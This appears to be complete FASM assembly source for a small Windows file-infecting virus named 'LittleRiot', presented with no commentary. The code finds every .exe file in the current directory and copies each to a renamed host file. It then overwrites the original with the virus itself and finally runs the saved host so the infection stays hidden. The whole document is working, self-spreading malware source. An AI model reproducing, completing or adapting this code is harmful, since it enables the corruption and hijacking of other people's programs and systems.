include "%fasminc%\win32ax.inc"
LittleRiot:		 invoke GetCommandLine
			 mov ebx, eax
			 inc ebx
			 xor ecx, ecx
GetEndCmd:		 cmp byte [ebx], '"'
			 je HaveEndCmd
			 inc ebx
			 inc ecx
			 jmp GetEndCmd
HaveEndCmd:		 mov byte [ebx], 0
			 sub ebx,ecx
			 push ebx
			 invoke FindFirstFile, ExeFiles, Win32FindData
			 mov dword [FindHandle], eax
FindMore:		 cmp eax, 0
			 je ExecuteHost
			 mov ebx, Win32FindData.cFileName
			 call GetHostName
			 invoke CopyFile, Win32FindData.cFileName, HostName, 1
			 cmp eax, 0
			 je FindNextVictim
			 pop ebx
			 invoke CopyFile, ebx, Win32FindData.cFileName, 0
			 push ebx
FindNextVictim: 	 invoke FindNextFile, dword [FindHandle], Win32FindData
			 jmp FindMore
ExecuteHost:		 pop ebx
			 call GetHostName
			 invoke WinExec, HostName, SW_SHOWNORMAL
			 ret
GetHostName :		 cmp byte [ebx],  0
			 je RenameHostName
			 inc ebx
			 jmp GetHostName
RenameHostName: 	 sub ebx, 8
			 mov esi, ebx
			 mov edi, HostName
			 mov ecx, 5
			 rep movsb
			 ret
data import
			library kernel32,	"KERNEL32.DLL"
			import kernel32,\
			       GetCommandLine,	"GetCommandLineA",\
			       FindFirstFile,	"FindFirstFileA",\
			       FindNextFile,	"FindNextFileA",\
			       CopyFile,	"CopyFileA",\
			       WinExec, 	"WinExec"
end data
			ExeFiles	db "*.exe",0
			FindHandle	dd ?
			Win32FindData	FINDDATA
			HostName	rb 6